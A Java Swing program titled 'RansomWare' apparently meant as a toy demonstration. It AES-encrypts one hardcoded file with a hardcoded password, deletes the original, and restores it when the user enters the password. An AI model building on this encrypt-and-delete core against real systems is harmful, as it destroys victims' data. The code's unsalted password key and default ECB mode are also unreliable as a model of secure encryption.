import java.awt.*;
import javax.swing.*;
import java.awt.event.*;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.security.MessageDigest;
import java.util.Arrays;
public class Main extends JFrame implements ActionListener {

    private static final String AES_ALGORITHM = "AES";
    
    JTabbedPane tp = new JTabbedPane();
    JPanel encrypt = new JPanel(new GridLayout(3, 1));
    JPanel decrypt = new JPanel(new GridLayout(4, 1));
    JLabel ef = new JLabel("Encrypt Files");
    JLabel df = new JLabel("Decrypt Files");
    JButton enc = new JButton("Encrypt");
    JButton dec = new JButton("Decrypt");
    JTextField pass = new JTextField();
    JLabel message = new JLabel();
    JLabel status = new JLabel();
    String inputFile = "plaintext.txt";
    String encryptedFile = "encryptedFile.enc";
    String decryptedFile = "decryptedFile.txt";
    String password = "SecretPassword";

    public Main(){

        setTitle("RansomWare");        
        enc.addActionListener(this);        
        dec.addActionListener(this);        

        encrypt.add(ef);
        encrypt.add(enc);
        encrypt.add(status);

        decrypt.add(df);
        decrypt.add(pass);
        decrypt.add(dec);
        decrypt.add(message);

        tp.add("Encrypt",encrypt);
        tp.add("Decrypt",decrypt);

        add(tp);

        setSize(500, 500);
        setVisible(true);
        setDefaultCloseOperation(EXIT_ON_CLOSE);
    }

    public void actionPerformed(ActionEvent e){

        if(e.getSource()==enc){
            try{
                encryptFile(inputFile, encryptedFile, password);
                status.setText("Files Encrypted and Original Deleted");
            }catch (Exception ex) {
                System.out.println("Error: " + ex.getMessage());
            }

        }else if(e.getSource()==dec){
            try{
                String passs=pass.getText().toString();
                decryptFile(encryptedFile, decryptedFile, passs);
                message.setText("Files Decrypted and Restored Successfully");
            }catch (Exception ex) {
                System.out.println("Error: " + ex.getMessage());
            }
        }

    }
    public static void main(String[] args) {
        new Main();
    }

    public static void encryptFile(String inputFile, String outputFile, String password) throws Exception {
        byte[] key = generateKey(password);
        SecretKey secretKey = new SecretKeySpec(key, AES_ALGORITHM);
        Cipher cipher = Cipher.getInstance(AES_ALGORITHM);
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);
        File f = new File("plaintext.txt");

        try (InputStream inputStream = new FileInputStream(inputFile);
             OutputStream outputStream = new FileOutputStream(outputFile)) {
            byte[] inputBuffer = new byte[4096];
            byte[] outputBuffer;
            int bytesRead;
            while ((bytesRead = inputStream.read(inputBuffer)) != -1) {
                outputBuffer = cipher.update(inputBuffer, 0, bytesRead);
                if (outputBuffer != null) {
                    outputStream.write(outputBuffer);
                }
            }
            outputBuffer = cipher.doFinal();
            if (outputBuffer != null) {
                outputStream.write(outputBuffer);
            }
        }
        f.delete();

    }
    public static void decryptFile(String inputFile, String outputFile, String password) throws Exception {
        byte[] key = generateKey(password);
        SecretKey secretKey = new SecretKeySpec(key, AES_ALGORITHM);
        Cipher cipher = Cipher.getInstance(AES_ALGORITHM);
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        File f2 = new File("encryptedFile.enc");
        
        

        try (InputStream inputStream = new FileInputStream(inputFile);
             OutputStream outputStream = new FileOutputStream(outputFile)) {
            byte[] inputBuffer = new byte[4096];
            byte[] outputBuffer;
            int bytesRead;
            while ((bytesRead = inputStream.read(inputBuffer)) != -1) {
                outputBuffer = cipher.update(inputBuffer, 0, bytesRead);
                if (outputBuffer != null) {
                    outputStream.write(outputBuffer);
                }
            }
            outputBuffer = cipher.doFinal();
            if (outputBuffer != null) {
                outputStream.write(outputBuffer);
            }
        }
        f2.delete();
        
    }

    private static byte[] generateKey(String password) throws Exception {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] key = digest.digest(password.getBytes("UTF-8"));
        return Arrays.copyOf(key, 16); 
    }
    
}
